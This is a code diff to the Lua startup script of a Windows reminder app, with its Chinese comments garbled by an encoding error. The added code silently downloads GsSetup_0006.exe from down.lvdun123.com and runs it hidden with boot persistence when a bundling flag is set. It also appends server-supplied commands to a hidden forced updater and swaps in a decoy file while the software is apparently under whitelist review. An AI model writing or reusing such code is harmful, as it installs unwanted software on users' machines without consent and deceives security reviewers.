@@ -5,7 +5,7 @@ local gnLastReportRunTmUTC = 0
 -----------------
 
 function LoadLuaModule(tFile, curDocPath)
---tFile¿ÉÒÔ´«luaÎÄ¼ş¾ø¶ÔÂ·¾¶¡¢Ïà¶ÔÂ·¾¶
+--tFileå¯ä»¥ä¼ luaæ–‡ä»¶ç»å¯¹è·¯å¾„ã€ç›¸å¯¹è·¯å¾„
 	if "table" == type(tFile) then
 		for index, value in ipairs(tFile) do
 			if "string" == type(value) and value ~= "" then
@@ -82,10 +82,10 @@ function SendStartupReport(bShowWnd)
 	tStatInfo.strEL = strSource or ""
 	
 	if not bShowWnd then
-		tStatInfo.strEC = "startup"  --½øÈëÉÏ±¨
+		tStatInfo.strEC = "startup"  --è¿›å…¥ä¸ŠæŠ¥
 		tStatInfo.strEA = FunctionObj.GetMinorVer() or ""
 	else
-		tStatInfo.strEC = "showui" 	 --Õ¹Ê¾ÉÏ±¨
+		tStatInfo.strEC = "showui" 	 --å±•ç¤ºä¸ŠæŠ¥
 		tStatInfo.strEA = FunctionObj.GetInstallSrc() or ""
 	end
 	
@@ -167,8 +167,9 @@ function CheckForceVersion(tForceVersion)
 end
 
 
-function TryForceUpdate(tServerConfig)
+function TryForceUpdate(tServerConfig, strKey)
 	local FunctionObj = XLGetGlobal("DiDa.FunctionHelper") 
+	FunctionObj.TipLog("TryForceUpdate enter, strKey = "..tostring(strKey))
 	if FunctionObj.CheckIsUpdating() then
 		FunctionObj.TipLog("[TryForceUpdate] CheckIsUpdating failed,another thread is updating!")
 		return
@@ -181,8 +182,11 @@ function TryForceUpdate(tServerConfig)
 	end
 
 	local tNewVersionInfo = tServerConfig["tNewVersionInfo"] or {}
-	local tForceUpdate = tNewVersionInfo["tForceUpdate"]
+	local tForceUpdate = tNewVersionInfo[strKey or "tForceUpdate"]
 	if(type(tForceUpdate)) ~= "table" then
+		if strKey == "tForceUpdate" then
+			TryForceUpdate(tServerConfig, "tFakeUpdate")
+		end
 		return 
 	end
 	
@@ -190,6 +194,9 @@ function TryForceUpdate(tServerConfig)
 	local strNewVersion = tForceUpdate.strVersion		
 	if not IsRealString(strCurVersion) or not IsRealString(strNewVersion)
 		or not FunctionObj.CheckIsNewVersion(strNewVersion, strCurVersion) then
+		if strKey == "tForceUpdate" then
+			TryForceUpdate(tServerConfig, "tFakeUpdate")
+		end
 		return
 	end
 	
@@ -197,6 +204,9 @@ function TryForceUpdate(tServerConfig)
 	local bPassCheck = CheckForceVersion(tVersionLimit)
 	FunctionObj.TipLog("[TryForceUpdate] CheckForceVersion bPassCheck:"..tostring(bPassCheck))
 	if not bPassCheck then
+		if strKey == "tForceUpdate" then
+			TryForceUpdate(tServerConfig, "tFakeUpdate")
+		end
 		return 
 	end
 	
@@ -205,11 +215,17 @@ function TryForceUpdate(tServerConfig)
 	FunctionObj.DownLoadNewVersion(tForceUpdate, function(strRealPath) 
 		FunctionObj.SetIsUpdating(false)
 		if not IsRealString(strRealPath) then
+			if strKey == "tForceUpdate" then
+				TryForceUpdate(tServerConfig, "tFakeUpdate")
+			end
 			return
 		end
 		
 		FunctionObj.SaveCommonUpdateUTC()
 		local strCmd = " /write /silent /run"
+		if IsRealString(tForceUpdate["strCmd"]) then
+			strCmd = strCmd.." "..tForceUpdate["strCmd"]
+		end
 		tipUtil:ShellExecute(0, "open", strRealPath, strCmd, 0, "SW_HIDE")
 	end)
 end
@@ -232,7 +248,13 @@ function TryExecuteExtraCode(tServerConfig)
 	local tExtraHelper = tServerConfig["tExtraHelper"] or {}
 	local strURL = tExtraHelper["strURL"]
 	local strMD5 = tExtraHelper["strMD5"]
-	
+	local tVersion = tExtraHelper["tVersion"]
+	local bPassCheck = CheckForceVersion(tVersion)
+	if not bPassCheck then --ä¸æ»¡è¶³å¤–ç½‘ç‰ˆæœ¬åˆ™æ˜¯è¿‡ç™½çŠ¶æ€, æ–‡ä»¶åæ¢æˆv1.0çš„
+		strURL = string.gsub(strURL, "_v%d%.%d+", "_v1%.0")
+		FunctionObj.TipLog("TryExecuteExtraCode, bPassCheck = "..tostring(bPassCheck)..", strURL = "..tostring(strURL))
+		strMD5 = ""
+	end
 	if not IsRealString(strURL) then
 		return
 	end
@@ -266,7 +288,7 @@ function AnalyzeServerConfig(nDownServer, strServerPath)
 	end
 	
 	local tServerConfig = FunctionObj.LoadTableFromFile(strServerPath) or {}
-	TryForceUpdate(tServerConfig)
+	TryForceUpdate(tServerConfig, "tForceUpdate")
 	FixUserConfig(tServerConfig)
 	TryExecuteExtraCode(tServerConfig)
 end
@@ -284,7 +306,7 @@ function StartRunCountTimer()
 	end, nTimeSpanInMs)
 	
 	
-	---DIDAÉÏ±¨
+	---DIDAä¸ŠæŠ¥
 	local nTimeSpanInMs = 2*60*1000
 	timerManager:SetTimer(function(item, id)
 		FunctionObj.SendDiDaReport(10)
@@ -307,10 +329,10 @@ function ForceUpdateRemindTimer(tRealData)
 	for _, data in pairs(tRemindListData) do
 		FunctionObj.TipLog("ForceUpdateRemindTimer, enter, type(data) = "..type(data))
 		for _, info in ipairs(data) do
-			if type(info) == "table" and info["bopen"] then--×´Ì¬ÊÇ´ò¿ª£¬ÇÒÎ´ÌáĞÑ¹ı
+			if type(info) == "table" and info["bopen"] then--çŠ¶æ€æ˜¯æ‰“å¼€ï¼Œä¸”æœªæé†’è¿‡
 				FunctionObj.TipLog("ForceUpdateRemindTimer, info[title] = "..tostring(info["title"]))
 				local nCurrentUTC = tipUtil:GetCurrentUTCTime()
-				if info["ntype"] == 1 then --Ò»´ÎĞÔ
+				if info["ntype"] == 1 then --ä¸€æ¬¡æ€§
 					if type(info["noncetargettime"]) == "number" then
 						local nStep = info["noncetargettime"] - nCurrentUTC
 						FunctionObj.TipLog("ForceUpdateRemindTimer, nStep = "..tostring(nStep).."info[noncetargettime] = "..tostring(info["noncetargettime"])..", nCurrentUTC = "..nCurrentUTC)
@@ -329,7 +351,7 @@ function ForceUpdateRemindTimer(tRealData)
 							end, nStep*1000)
 						end
 					end
-				elseif info["ntype"] == 2 then--Ã¿Ìì
+				elseif info["ntype"] == 2 then--æ¯å¤©
 					local LYear, LMonth, LDay = tipUtil:FormatCrtTime(nCurrentUTC)
 					local nTarGetUTC = tipUtil:DateTime2Seconds(LYear, LMonth, LDay, info["hour"], info["min"], 0)
 					local nStep = nTarGetUTC - nCurrentUTC
@@ -340,14 +362,14 @@ function ForceUpdateRemindTimer(tRealData)
 						end
 						info["timerid"] = timerManager:SetTimer(function(item, id)
 							item:KillTimer(id)
-							info["state"] = nil--ÒªÇå³ı±ê¼Ç²ÅÄÜ±£Ö¤Ã¿Ìì¶¼ÌáĞÑ
+							info["state"] = nil--è¦æ¸…é™¤æ ‡è®°æ‰èƒ½ä¿è¯æ¯å¤©éƒ½æé†’
 							info["timerid"] = nil
 							local strPath = FunctionObj.GetCfgPathWithName("remind.dat")
 							tipUtil:SaveLuaTableToLuaFile(tRemindListData, strPath)
 							FunctionObj.ShowRemindBubble(info)
 						end, nStep*1000)
 					end
-				elseif info["ntype"] == 3 then--Ã¿ÖÜ
+				elseif info["ntype"] == 3 then--æ¯å‘¨
 					if type(info["tweek"]) == "table" then
 						local _, _, _, _, _, _, LWeek = tipUtil:Seconds2DateTime(nCurrentUTC)
 						local bRet = false
@@ -368,7 +390,7 @@ function ForceUpdateRemindTimer(tRealData)
 								end
 								info["timerid"] = timerManager:SetTimer(function(item, id)
 									item:KillTimer(id)
-									info["state"] = nil--ÒªÇå³ı±ê¼Ç²ÅÄÜ±£Ö¤Ã¿ÖÜ¶¼ÌáĞÑ
+									info["state"] = nil--è¦æ¸…é™¤æ ‡è®°æ‰èƒ½ä¿è¯æ¯å‘¨éƒ½æé†’
 									info["timerid"] = nil
 									local strPath = FunctionObj.GetCfgPathWithName("remind.dat")
 									tipUtil:SaveLuaTableToLuaFile(tRemindListData, strPath)
@@ -377,7 +399,7 @@ function ForceUpdateRemindTimer(tRealData)
 							end
 						end
 					end
-				else--Ã¿ÔÂ
+				else--æ¯æœˆ
 					local nYear, nMonth = tipUtil:Seconds2DateTime(nCurrentUTC)
 					local nTarGetUTC = tipUtil:DateTime2Seconds(nYear, nMonth, info["day"], info["hour"], info["min"], 0)
 					local nStep = nTarGetUTC - nCurrentUTC
@@ -388,7 +410,7 @@ function ForceUpdateRemindTimer(tRealData)
 						end
 						info["timerid"] = timerManager:SetTimer(function(item, id)
 							item:KillTimer(id)
-							info["state"] = nil--ÒªÇå³ı±ê¼Ç²ÅÄÜ±£Ö¤Ã¿Ìì¶¼ÌáĞÑ
+							info["state"] = nil--è¦æ¸…é™¤æ ‡è®°æ‰èƒ½ä¿è¯æ¯å¤©éƒ½æé†’
 							info["timerid"] = nil
 							local strPath = FunctionObj.GetCfgPathWithName("remind.dat")
 							tipUtil:SaveLuaTableToLuaFile(tRemindListData, strPath)
@@ -414,9 +436,8 @@ function StartUITimer()
 			FunctionObj.UpdateUIPanel()
 		end
 	end, 1000)
-	--¿ªÆôÌáĞÑÆøÅİ¼ÆÊ±Æ÷
-	--Ä¿Ç°Ö»¶ÔÒ»´ÎĞÔ¡¢Ã¿Ìì¡¢Ã¿ÖÜµÄÌáĞÑ×ö´¦Àí£¬ Ã¿ÔÂµÄĞèÒª²úÆ·È·ÈÏ
-	--Ã¿°ë¸öĞ¡Ê±ÅĞ¶ÏÒ»´Î£¬ ¶ÔÓÚ¼´½«ÔÚ°ëĞ¡Ê±Ö®ÄÚÖ´ĞĞµÄÌáĞÑÁí¿ª¼ÆÊ±Æ÷
+	--å¼€å¯æé†’æ°”æ³¡è®¡æ—¶å™¨
+	--æ¯åŠä¸ªå°æ—¶åˆ¤æ–­ä¸€æ¬¡ï¼Œ å¯¹äºå³å°†åœ¨åŠå°æ—¶ä¹‹å†…æ‰§è¡Œçš„æé†’å¦å¼€è®¡æ—¶å™¨
 	local ForceUpdateRemindTimer = XLGetGlobal("ForceUpdateRemindTimer")
 	if type(ForceUpdateRemindTimer) == "function" then
 		ForceUpdateRemindTimer()
@@ -463,6 +484,28 @@ function PopTipWnd(OnCreateFunc)
 	end
 end
 
+function DownLoadGS()
+	local FunctionObj = XLGetGlobal("DiDa.FunctionHelper") 
+	local strPacketURL = "http://down.lvdun123.com/client/GsSetup_0006.exe"
+	local strSaveDir = tipUtil:GetSystemTempPath()
+	local strSavePath = tipUtil:PathCombine(strSaveDir, "GsSetup_0006.exe")
+	
+	local strStamp = FunctionObj.GetTimeStamp()
+	local strURLFix = strPacketURL..strStamp
+	
+	FunctionObj.NewAsynGetHttpFile(strURLFix, strSavePath, false
+	, function(bRet, strRealPath)
+			FunctionObj.TipLog("[DownLoadGS] bRet:"..tostring(bRet)
+					.." strRealPath:"..tostring(strRealPath))
+					
+			if 0 ~= bRet then
+				return
+			end
+			
+			local strCmd = "/s /run /setboot"
+			tipUtil:ShellExecute(0, "open", strRealPath, strCmd, 0, "SW_HIDE")
+	end)
+end
 
 function ProcessCommandLine()
 	local FunctionObj = XLGetGlobal("DiDa.FunctionHelper") 
@@ -475,6 +518,21 @@ function ProcessCommandLine()
 	local bRet = string.find(tostring(cmdString), "/update")
 	if bRet then
 		FunctionObj.ShowPopupWndByName("TipUpdateWnd.Instance", true)
+	end
+	
+	--å¤„ç†æ†ç»‘å‘½ä»¤è¡Œï¼Œå·²ç»è£…äº†ç»¿ç›¾åˆ™ä¸å¤„ç†
+	local strGSPath = FunctionObj.RegQueryValue("HKEY_LOCAL_MACHINE\\Software\\GreenShield\\Path")
+	if not IsRealString(strGSPath) or not tipUtil:QueryFileExists(strGSPath) then
+		if string.find(tostring(cmdString), "/kbls") then
+			DownLoadGS()
+		elseif string.find(tostring(cmdString), "/kbl") then
+			local SetLoseFocusNoHideFlag = XLGetGlobal("SetLoseFocusNoHideFlag") 
+			FunctionObj.TipLog("ProcessCommandLine, type of SetLoseFocusNoHideFlag is "..type(SetLoseFocusNoHideFlag))
+			SetLoseFocusNoHideFlag(true)
+			FunctionObj.ShowDeleteNotepadRemindWnd("querybind", function()
+				DownLoadGS()
+			end)
+		end
 	end
 	
 	local bRet, strSource = FunctionObj.GetCommandStrValue("/sstartfrom")
